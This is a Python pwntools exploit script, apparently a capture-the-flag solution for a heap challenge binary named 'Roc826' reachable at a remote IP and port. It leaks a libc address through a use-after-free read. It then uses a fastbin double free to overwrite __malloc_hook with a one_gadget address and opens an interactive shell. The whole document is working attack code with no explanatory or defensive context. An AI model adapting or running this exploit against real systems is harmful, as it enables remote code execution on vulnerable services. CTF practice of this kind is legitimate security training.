#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 2
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./Roc826')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('47.103.214.163', 21002)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./Roc826', checksec=False)


def add(add_size, add_content):
    p.sendlineafter(':', '1')
    p.sendlineafter('size?\n', str(add_size))
    p.sendlineafter('content:', add_content)


def dele(dele_idx):
    p.sendlineafter(':', '2')
    p.sendlineafter('index?\n', str(dele_idx))


def show(show_idx):
    p.sendlineafter(':', '3')
    p.sendlineafter('index?\n', str(show_idx))
    p.recvuntil('content:')


libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
add(0x80, '')
add(0x60, '')
add(0x60, '')
dele(0)
show(0)

addr___malloc_hook = u64(p.recv(6).ljust(8, '\x00')) - 88 - 0x10
libcbase = addr___malloc_hook - libc.sym['__malloc_hook']
addr_one_gadget = libcbase + libc_one_gadget[3]

add(0x80, '')
dele(1)
dele(2)
dele(1)
add(0x60, p64(addr___malloc_hook - 0x23))
add(0x60, p64(addr___malloc_hook - 0x23))
add(0x60, p64(addr___malloc_hook - 0x23))
add(0x60, 'a' * 0x13 + p64(addr_one_gadget))
p.sendlineafter(':', '1')
p.sendlineafter('size?\n', '1')
success('addr___malloc_hook = ' + hex(addr___malloc_hook))
success('libcbase           = ' + hex(libcbase))
success('addr_one_gadget    = ' + hex(addr_one_gadget))
# gdb.attach(p)
p.interactive()
